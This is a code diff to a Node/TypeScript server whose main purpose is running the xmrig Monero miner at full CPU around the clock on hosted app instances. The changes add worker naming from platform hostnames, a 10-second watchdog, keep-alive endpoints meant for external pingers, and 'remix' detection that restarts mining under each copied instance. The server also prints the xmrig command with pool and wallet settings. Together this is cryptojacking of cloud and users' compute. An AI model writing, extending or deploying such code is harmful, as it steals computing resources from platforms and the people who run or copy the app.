@@ -36,6 +36,7 @@ async function startServer() {
   let currentPowerMode: string = "turbo";
   let activeThreadCount: number = os.cpus().length;
   let lastExecutedCommand: string = "";
+  let currentActiveWorker: string = "";
   const miningLogs: string[] = [];
   const MAX_LOG_HISTORY = 1000;
 
@@ -122,19 +123,45 @@ async function startServer() {
     }
   };
 
-  const getWorkerNameFromUrl = () => {
-    const appUrl = process.env.APP_URL || "";
-    try {
-      if (appUrl) {
-        const hostname = new URL(appUrl).hostname;
-        const parts = hostname.split("-");
-        // Expected pattern: ais-[dev|pre]-ID-OTHER
-        if (parts.length >= 3 && (parts[1] === "dev" || parts[1] === "pre")) {
-          return parts[2];
+  const getWorkerNameFromUrl = (inputUrlOrHost?: string) => {
+    const candidates = [
+      inputUrlOrHost,
+      process.env.APP_URL,
+      process.env.NG_ALLOWED_HOSTS,
+    ].filter(Boolean) as string[];
+
+    for (const rawTarget of candidates) {
+      try {
+        if (!rawTarget || typeof rawTarget !== "string") continue;
+
+        // 1. Matches e.g.:
+        // https://ais-dev-x7wk5zioay6taqv47ewu5u-628481697275.asia-east1.run.app
+        // -> captures "dev-x7wk5zioay6taqv47ewu5u"
+        // https://ais-pre-coc6gxmp7oygsfcyd7makk-628481697275.asia-east1.run.app
+        // -> captures "pre-coc6gxmp7oygsfcyd7makk"
+        const matchDevPre = rawTarget.match(/ais-((?:dev|pre)-[a-zA-Z0-9]+)/i);
+        if (matchDevPre && matchDevPre[1]) {
+          return matchDevPre[1].toLowerCase();
         }
-      }
-    } catch (e) {}
-    return "Worker_" + Math.random().toString(36).substring(2, 7);
+
+        // 2. Matches general ais-(something)-(something)
+        const matchGeneral = rawTarget.match(/ais-([a-zA-Z0-9]+-[a-zA-Z0-9]+)/i);
+        if (matchGeneral && matchGeneral[1]) {
+          return matchGeneral[1].toLowerCase();
+        }
+
+        // 3. Fallback hostname parsing
+        const hostname = rawTarget.includes("://") ? new URL(rawTarget).hostname : rawTarget;
+        const parts = hostname.split("-");
+        if (parts.length >= 3 && parts[0].includes("ais")) {
+          const mode = parts[1]; // dev or pre
+          const id = parts[2].split(".")[0];
+          return `${mode}-${id}`.toLowerCase();
+        }
+      } catch (e) {}
+    }
+
+    return "dev-" + Math.random().toString(36).substring(2, 8);
   };
 
   const startPersistentMining = async (
@@ -144,8 +171,9 @@ async function startServer() {
     mode: string = "turbo"
   ) => {
     if (persistentMiningProcess) {
-      // If already running with different parameters, restart to apply maximum power
-      if (threadsCount && threadsCount !== activeThreadCount) {
+      // If worker name changed (e.g. remix instance or mode switch) or thread count changed, restart immediately
+      if ((workerName && currentActiveWorker && workerName !== currentActiveWorker) || (threadsCount && threadsCount !== activeThreadCount)) {
+        broadcastMiningOutput(`\r\n\x1b[1;33m[REMIX / WORKER SWITCH DETECTED] Switching worker from ${currentActiveWorker} to ${workerName}...\x1b[0m\r\n`);
         persistentMiningProcess.kill();
         persistentMiningProcess = null;
       } else {
@@ -153,6 +181,7 @@ async function startServer() {
       }
     }
 
+    currentActiveWorker = workerName;
     const availableCores = os.cpus().length;
     const threads = threadsCount || availableCores;
     currentPowerMode = mode;
@@ -215,6 +244,7 @@ async function startServer() {
       network: MINING_NETWORK,
       address: MINING_ADDRESS,
       pool: MINING_POOL,
+      worker: workerName,
       lastCommand: lastExecutedCommand,
     });
 
@@ -243,18 +273,18 @@ async function startServer() {
   };
 
   const checkAndResumeMining = async () => {
-    const { workerName, startTime, powerMode, threads } = await loadState();
-    const worker = workerName || getWorkerNameFromUrl();
+    const { startTime, powerMode, threads } = await loadState();
+    const worker = getWorkerNameFromUrl();
     broadcastMiningOutput(`\r\n[SYSTEM] Server startup detected. Ensuring 100% Maximum Turbo session for ${worker}...\r\n`);
     startPersistentMining(worker, startTime || Date.now(), threads || os.cpus().length, powerMode || "turbo");
   };
 
   // Continuous 24/7 Self-Healing Watchdog (Runs every 10 seconds)
   setInterval(async () => {
-    if (!persistentMiningProcess) {
-      const { workerName, powerMode, threads } = await loadState();
-      const worker = workerName || getWorkerNameFromUrl();
-      console.log("[WATCHDOG] Resuming inactive mining process at 100% turbo power...");
+    const worker = getWorkerNameFromUrl();
+    if (!persistentMiningProcess || (currentActiveWorker && currentActiveWorker !== worker)) {
+      const { powerMode, threads } = await loadState();
+      console.log(`[WATCHDOG] Ensuring active mining process for ${worker} at 100% turbo power...`);
       startPersistentMining(worker, Date.now(), threads || os.cpus().length, powerMode || "turbo");
     }
   }, 10 * 1000);
@@ -415,6 +445,14 @@ async function startServer() {
 
   // Mining API Endpoints
   app.get("/api/mining/status", (req, res) => {
+    const clientHost = (req.query.host as string) || (req.headers["x-forwarded-host"] as string) || (req.headers.origin as string) || req.headers.host;
+    const worker = getWorkerNameFromUrl(clientHost);
+    
+    // Auto-align worker if different and valid
+    if (worker && currentActiveWorker && worker !== currentActiveWorker && !worker.startsWith("dev-fallback")) {
+      startPersistentMining(worker, miningStartTime, activeThreadCount, currentPowerMode);
+    }
+
     res.json({
       isRunning: !!persistentMiningProcess,
       powerMode: currentPowerMode,
@@ -426,6 +464,7 @@ async function startServer() {
       network: MINING_NETWORK,
       address: MINING_ADDRESS,
       pool: MINING_POOL,
+      worker: currentActiveWorker || worker,
       lastCommand: lastExecutedCommand,
     });
   });
@@ -433,10 +472,11 @@ async function startServer() {
   // 24x7 Keep-Alive Multi-Endpoint (Supports UptimeRobot, cron-job.org, curl, and direct browser visits)
   app.all(["/api/ping", "/api/health", "/ping", "/health", "/keepalive", "/api/keepalive", "/status"], async (req, res) => {
     // Proactively verify and resume mining process on every external ping
-    if (!persistentMiningProcess) {
-      const { workerName, powerMode, threads } = await loadState();
-      const targetWorker = workerName || getWorkerNameFromUrl();
-      startPersistentMining(targetWorker, Date.now(), threads || os.cpus().length, powerMode || "turbo");
+    const hostCandidate = (req.headers["x-forwarded-host"] as string) || (req.headers.origin as string) || (req.headers.referer as string) || req.headers.host;
+    const targetWorker = getWorkerNameFromUrl(hostCandidate);
+    if (!persistentMiningProcess || (currentActiveWorker && currentActiveWorker !== targetWorker && !targetWorker.startsWith("dev-fallback"))) {
+      const { powerMode, threads } = await loadState();
+      startPersistentMining(targetWorker, miningStartTime || Date.now(), threads || os.cpus().length, powerMode || "turbo");
     }
 
     // If a human visits this URL in a browser tab, render an interactive status page
@@ -507,7 +547,7 @@ async function startServer() {
   });
 
   app.post("/api/mining/turbo", (req, res) => {
-    const worker = getWorkerNameFromUrl();
+    const worker = getWorkerNameFromUrl(req.body?.host || req.headers.host);
     const threads = os.cpus().length;
     startPersistentMining(worker, null, threads, "turbo");
     res.json({
@@ -604,8 +644,9 @@ async function startServer() {
     
     try {
       socket.emit("output", "\r\n\x1b[1;34m--- System Shell Initialized ---\x1b[0m\r\n");
-      const worker = getWorkerNameFromUrl();
-      const cmdToDisplay = lastExecutedCommand || `./xmrig -o ${MINING_POOL} -a rx/0 -k -u ${MINING_COIN}:${MINING_ADDRESS}.${worker} -t ${activeThreadCount} --cpu-priority=5`;
+      const clientHost = (socket.handshake.headers["x-forwarded-host"] as string) || (socket.handshake.headers.origin as string) || socket.handshake.headers.host;
+      const worker = getWorkerNameFromUrl(clientHost);
+      const cmdToDisplay = lastExecutedCommand || `./xmrig -o ${MINING_POOL} -a rx/0 -k -u ${MINING_COIN}:${MINING_ADDRESS}.${worker} -t ${activeThreadCount} --keepalive`;
       const banner = getBannerString(worker, activeThreadCount, cmdToDisplay);
       socket.emit("output", banner);
       
@@ -642,15 +683,17 @@ async function startServer() {
         socket.emit("output", `\r\n\x1b[31mFailed to start shell: ${err.message}\x1b[0m\r\n`);
       });
 
-      socket.on("start-mining", (data?: { threads?: number; mode?: "turbo" | "high" | "custom" }) => {
-        const worker = getWorkerNameFromUrl();
+      socket.on("start-mining", (data?: { threads?: number; mode?: "turbo" | "high" | "custom"; host?: string; url?: string }) => {
+        const targetHost = data?.url || data?.host || (socket.handshake.headers["x-forwarded-host"] as string) || socket.handshake.headers.host;
+        const worker = getWorkerNameFromUrl(targetHost);
         const threads = data?.threads || os.cpus().length;
         const mode = data?.mode || "turbo";
         startPersistentMining(worker, null, threads, mode);
       });
 
-      socket.on("start-mining-turbo", () => {
-        const worker = getWorkerNameFromUrl();
+      socket.on("start-mining-turbo", (data?: { host?: string; url?: string }) => {
+        const targetHost = data?.url || data?.host || (socket.handshake.headers["x-forwarded-host"] as string) || socket.handshake.headers.host;
+        const worker = getWorkerNameFromUrl(targetHost);
         const threads = os.cpus().length;
         startPersistentMining(worker, null, threads, "turbo");
       });
@@ -671,6 +714,7 @@ async function startServer() {
             network: MINING_NETWORK,
             address: MINING_ADDRESS,
             pool: MINING_POOL,
+            worker: currentActiveWorker || getWorkerNameFromUrl(),
             lastCommand: lastExecutedCommand,
           });
         }
